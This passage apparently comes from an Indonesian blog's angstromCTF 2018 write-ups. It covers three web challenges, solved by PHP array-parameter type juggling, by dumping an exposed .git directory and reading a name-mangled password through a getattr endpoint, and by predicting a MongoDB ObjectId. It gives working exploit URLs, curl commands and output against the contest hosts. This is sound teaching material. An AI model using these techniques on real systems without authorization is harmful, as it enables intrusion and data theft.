+  <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str1"</span><span class="p">]</span> <span class="k">and</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str2"</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str1"</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str2"</span><span class="p">]</span> <span class="k">and</span>
+        <span class="nb">hash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$salt</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str1"</span><span class="p">])</span> <span class="o">===</span> <span class="nb">hash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$salt</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"str2"</span><span class="p">]))</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"Sorry, you're wrong."</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">exit</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"font-size: 18pt; margin: 10% 10% 10% 10%"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;p&gt;</span>
+    People say that MD5 is broken... But they're wrong! All I have to do is use a secret salt. &gt;:)
+  <span class="nt">&lt;/p&gt;</span>
+  <span class="nt">&lt;p&gt;</span>
+    If you can find two distinct strings that—when prepended with my salt—have the same MD5 hash, I'll give you a flag. Deal?
+  <span class="nt">&lt;/p&gt;</span>
+  <span class="nt">&lt;p&gt;</span>
+    Also, here's the <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"src"</span><span class="nt">&gt;</span>source<span class="nt">&lt;/a&gt;</span>.
+  <span class="nt">&lt;/p&gt;</span>
+  <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
+    String 1: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"str1"</span> <span class="na">style=</span><span class="s">"font-size: 18pt; margin: 10px 10px 10px 10px"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;br&gt;</span>
+    String 2: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"str2"</span> <span class="na">style=</span><span class="s">"font-size: 18pt; margin: 10px 10px 10px 10px"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;br&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">style=</span><span class="s">"font-size: 18pt; margin: 10px 0 10px 0"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>kita diberikan website yang meminta 2 input string, yang harus mempunyai md5 yang hasilnya jika di bandingkan dengan
+<code class="highlighter-rouge">===</code> sama , dan di sana ada prepend dengan variable $salt yang kita tidak ketahui isinya, jadi attack menggunakan
+MD5 Magic hash tidak akan berhasil, untuk yg belum tau apa itu MD5 Magic Hash bisa lihat di <code class="highlighter-rouge">https://www.whitehatsec.com/blog/magic-hashes/</code></p>
+
+<p>jadi untuk menyelesaikan soal ini kita bisa merusak batasan validasi yang di buat menggunakan array di parameter input</p>
+
+<p><code class="highlighter-rouge">if ($_GET["str1"] !== $_GET["str2"] and hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"]))</code>
+jika kita lihat lebih dekat disitu ada 2 validasi, validasi yang pertama adalah str1 !== str2 kemudian validasi ke 2
+adalah hash md5 dari $salt+str1  harus sama dengan hash md5 dari $salt+str2
+dengan menggunakan array kita hanya membypass untuk validasi yang ke 2, agar validasi yang pertama juga bisa terbypass kita bisa menggunakan huruf yang berbeda,
+kurang lebih url akhirnya seperti ini : <code class="highlighter-rouge">http://web.angstromctf.com:3003/?str1[]=a&amp;str2[]=x</code> untuk mendapatkan flag</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$salt</span> <span class="o">=</span><span class="s2">"S3cr3t1337"</span><span class="p">;</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$salt</span><span class="o">.</span><span class="k">array</span><span class="p">(</span><span class="s2">"JOKOWI"</span><span class="p">))</span> <span class="o">===</span> <span class="nb">hash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$salt</span><span class="o">.</span><span class="k">array</span><span class="p">(</span><span class="s2">"WIDODO"</span><span class="p">)));</span>
+<span class="cp">?&gt;</span>
+/*
+Result True
+Sat 23:22:20 with root in /tmp/ok via 🐘 v7.1.14 took 3s 
+•% ➜ php x.php
+PHP Notice:  Array to string conversion in /tmp/ok/x.php on line 5
+PHP Notice:  Array to string conversion in /tmp/ok/x.php on line 5
+bool(true)
+*/
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">Flag: actf{but_md5_has_charm}</code></p>
+
+<h3 id="file-storer">FILE STORER</h3>
+<hr />
+<p>WEB, 160
+My friend made a file storage website that he says is super secure. Can you prove him wrong and get the admin password?</p>
+
+<p><code class="highlighter-rouge">Hint: Can't solve it? Git gud.</code></p>
+
+<p>so the hint is Git gud, and finally we found .git directory here <code class="highlighter-rouge">http://web2.angstromctf.com:8899/files/.git</code>
+and ue gitdumper to download all the content</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sat 16:50:18 with root in /tmp/test 
+•% ➜ gitdumper.sh http://web2.angstromctf.com:8899/files/.git/ .
+
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances.
+# Only for educational purposes!
+###########
+
+[*] Destination folder does not exist
+[+] Creating ./.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[+] Downloaded: objects/12/33bdadb67c905af6516a2e1b94ebf32a0a2f61
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/55/28cb84ba39060910e309688e2b340084623899
+[+] Downloaded: objects/aa/168eed25aa55fff21054a858329cb4e1187ff0
+[+] Downloaded: objects/b8/e1848501840d89d32c3f8eadfafe38a78f8203
+[+] Downloaded: objects/63/9c13293220ac138c16cddfa9bea84d16e0d1a7
+[+] Downloaded: objects/43/31a907733114461f8ce52a3076c48ac26c00c2
+[+] Downloaded: objects/29/fff8b2c54b09cf0318dde83d1bcbdc1d6d22e8
+
+</code></pre></div></div>
+
+<p>Setelah kita dump folder .git nya kita bisa checkout ke commit terakhirnya, tapi commit terakhirnya malah semua file sudah di delete
+jadi kita harus <code class="highlighter-rouge">git checkout --hard</code> untuk kembali ke commit sebelumnya</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sat 16:57:09 with root in /tmp/test on  1233bda [✘] 
+•% ➜ git reset --hard
+HEAD is now at 1233bda first commit
+</code></pre></div></div>
+
+<p>kita dapat file sourcecode index.py nya</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">abort</span>
+<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">user</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">files</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">def</span> <span class="nf">getPass</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">__password</span>
+
+<span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">users</span><span class="p">[</span><span class="s">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">(</span><span class="s">"admin"</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s">"FLAG"</span><span class="p">])</span>
+
+<span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">custom500</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">error</span><span class="p">),</span> <span class="mi">500</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">mainpage</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"action"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"Login"</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]]</span><span class="o">.</span><span class="n">getPass</span><span class="p">():</span>
+                    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]])</span>
+                <span class="k">return</span> <span class="s">"wrong password"</span>
+            <span class="k">return</span> <span class="s">"user does not exist"</span>
+        <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"action"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"Signup"</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+                <span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]]</span> <span class="o">=</span> <span class="n">user</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">],</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"password"</span><span class="p">])</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]])</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="s">"user already exists"</span>
+        <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"action"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"Add File"</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">addfile</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"loggedout.html"</span><span class="p">)</span>
+
+<span class="c">#beta feature for viewing info about other users - still testing</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/user/&lt;username&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">getInfo</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">],</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'field'</span><span class="p">],</span> <span class="bp">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">val</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span> <span class="k">return</span> <span class="n">val</span>
+    <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="s">"error"</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/files/&lt;path:file&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">getFile</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
+    <span class="k">if</span> <span class="s">"index.py"</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"no! bad user! bad!"</span>
+    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">addfile</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]]</span><span class="o">.</span><span class="n">getPass</span><span class="p">()</span> <span class="o">==</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"password"</span><span class="p">]:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span> <span class="n">downloadurl</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span> <span class="n">downloadurl</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">downloadurl</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"."</span><span class="p">):</span>
+            <span class="k">return</span> <span class="s">"file already exists"</span>
+        <span class="nb">file</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">downloadurl</span><span class="p">,</span> <span class="n">stream</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">downloadurl</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">"wb"</span><span class="p">)</span>
+        <span class="n">first</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">file</span><span class="o">.</span><span class="n">iter_content</span><span class="p">(</span><span class="n">chunk_size</span><span class="o">=</span><span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">first</span><span class="p">:</span> <span class="k">break</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+            <span class="n">first</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]]</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">downloadurl</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">users</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">"username"</span><span class="p">]])</span>
+    <span class="k">return</span> <span class="s">"bad password"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span> <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>yang menarik adalah fungsi berikut</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#beta feature for viewing info about other users - still testing</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s">"/user/&lt;username&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">getInfo</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">],</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">'field'</span><span class="p">],</span> <span class="bp">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">val</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span> <span class="k">return</span> <span class="n">val</span>
+    <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="s">"error"</span>
+</code></pre></div></div>
+<p>kita bisa menampilkan atribut yg kita mau dari user yang kita tentukan di url
+contohnya untuk mendapatkan username dari admin kita bisa lakukan posts request berikut</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sat 17:02:01 with root in /tmp/test on  1233bda 
+•% ➜ curl -X POST http://web2.angstromctf.com:8899/user/admin -d "field=username"
+admin#
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">user</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">files</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">def</span> <span class="nf">getPass</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">__password</span>
+
+<span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">users</span><span class="p">[</span><span class="s">"admin"</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">(</span><span class="s">"admin"</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s">"FLAG"</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>pada baris kode ini kita bisa lihat flag yang di ambil dari environment di masukan sebagai password dari user admin
+berarti untuk mendapatkan flag kita harus bisa mendapatkan password dari admin yg mana adalah flag :D
+variable untuk password adalah <code class="highlighter-rouge">__password</code> tapi untuk memunculkan password kita tidak bisa langsung memanggil field <code class="highlighter-rouge">__password</code> 
+karena double underscore pada variable disini memiliki arti (_classname__attributename) sebutannya adalah (Name Mangling)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Any identifier of the form __spam (at least two leading underscores, 
+at most one trailing underscore) is textually replaced with 
+_classname__spam, where classname is the current class name
+with leading underscore(s) stripped. This mangling is done 
+without regard to the syntactic position of the identifier, 
+so it can be used to define class-private instance and class
+ variables, methods, variables stored in globals, and even 
+ variables stored in instances. private to this class on 
+ instances of other classes.
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sat 17:02:01 with root in /tmp/test on  1233bda 
+•% ➜ curl -X POST http://web2.angstromctf.com:8899/user/admin -d "field=_user__password"
+actf{2_und3rsc0res_h1des_n0th1ng}#
+</code></pre></div></div>
+
+<p>untuk lebih legkap tentang underscore pada python bisa lihat di <code class="highlighter-rouge">https://shahriar.svbtle.com/underscores-in-python</code></p>
+
+<h3 id="the-best-website">THE BEST WEBSITE</h3>
+<hr />
+<p>WEB, 230
+I have created what I believe to be the best website ever. Or maybe it’s just really boring. I don’t know.
+<code class="highlighter-rouge">Hint: My database is humongous!</code> =&gt; MongoDB ?</p>
+
+<p><code class="highlighter-rouge">&lt;!--developers: make sure to record your actions in log.txt--&gt;</code> =&gt; <code class="highlighter-rouge">http://web.angstromctf.com:7667/log.txt</code></p>
+
+<p>pada file log.txt terlihat log pada perubahan yang di lakukan oleh developer dengan detail datetimenya</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sat Aug 10 2017 10:23:17 GMT-0400 (EDT) - Initial website
+Sat Aug 10 2017 14:54:07 GMT-0400 (EDT) - Database integration
+Sat Aug 11 2017 14:08:54 GMT-0400 (EDT) - Make some changes to the text
+Sat Mar 17 2018 16:24:17 GMT+0000 (UTC) - Add super secret flag to database
+</code></pre></div></div>
+<p>kemudian pada file <code class="highlighter-rouge">http://web.angstromctf.com:7667/js/init.js</code> ada endpoint boxes yang di fetch datanya menggunakan ajax</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ids</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"5aad412be07e1e001cfce6d2"</span><span class="p">,</span><span class="s2">"5aad412be07e1e001cfce6d3"</span><span class="p">,</span><span class="s2">"5aad412be07e1e001cfce6d4"</span><span class="p">];</span>
+	<span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+
+		<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+			<span class="na">url</span><span class="p">:</span> <span class="s2">"/boxes?ids="</span><span class="o">+</span><span class="nx">ids</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">","</span><span class="p">),</span>
+			<span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box1_title"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box1_caption"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box2_title"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box2_caption"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box3_title"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+				<span class="nx">$</span><span class="p">(</span><span class="s2">"#box3_caption"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">boxes</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"^"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+			<span class="p">}</span>
+		<span class="p">})</span>
+
+	<span class="p">});</span>
+</code></pre></div></div>
+
+<p>berdasarkan cluenya database menggunakan mongodb ternyata benar karena id yang digunakan sangat mirip dengan yang di gunakan pada mongodb
+<code class="highlighter-rouge">https://docs.mongodb.com/manual/reference/method/ObjectId/#ObjectIDs-BSONObjectIDSpecification</code> pada file log.txt yang mengatakan bahwa flag sudah ditambahkan ke database
+berarti kita bisa memunculkan flagnya dengan memasukan id flag pada endpoint boxes. pertama kita harus mengkonstruksi id dari flag yang di simpan</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ObjectID MongoDB
+a 4-byte value representing the seconds since the Unix epoch,
+a 3-byte machine identifier,
+a 2-byte process id, and
+a 3-byte counter, starting with a random value.
+</code></pre></div></div>
+<p>Object id yang di gunakan mongoDB mempunyai struktur diatas 4-byte
+pertama adalah hexadecimal dari unix epoch time, kita bisa dapatkan waktunya
+dari file log.txt <code class="highlighter-rouge">Sat Mar 17 2018 16:24:17 GMT+0000 (UTC)</code> mengkonversi kan ke epoch dan kemudian
+kedalam hexadecimal <code class="highlighter-rouge">5aad4131</code> kemudian machine identifier dan proccess id bisa di ambil dari id yang ada di script init.js <code class="highlighter-rouge">e07e1e</code> and proccess id <code class="highlighter-rouge">001c</code>
+dan last counter dari id yang ada adalah <code class="highlighter-rouge">fce6d4</code> jadi kita gunakan lastcounter+1 <code class="highlighter-rouge">fce6d5</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID= [4-Byte Hex representing unix epoch time]+[3-Byte Machine identifier]+[2-Byte Proccess Id]+[3-Byte Counter]
+Flag ID = 5aad4131e07e1e001cfce6d5
+
+Get =&gt; http://web.angstromctf.com:7667/boxes?ids=5aad412be07e1e001cfce6d2,5aad412be07e1e001cfce6d3,5aad4131e07e1e001cfce6d5
+Output =&gt; 
+{
+  boxes: [
+  {
+      _id: "5aad412be07e1e001cfce6d2",
+      data: "Go away.^This website has literally nothing of interest. You might as well leave.",
+      __v: 0
+  },
+  {
+      _id: "5aad412be07e1e001cfce6d3",
+      data: "You will be very bored.^Seriously, there's nothing interesting.",
+      __v: 0
+  },
+  {
+      _id: "5aad4131e07e1e001cfce6d5",
+      data: "actf{0bj3ct_ids_ar3nt_s3cr3ts}",
+      __v: 0
+  }
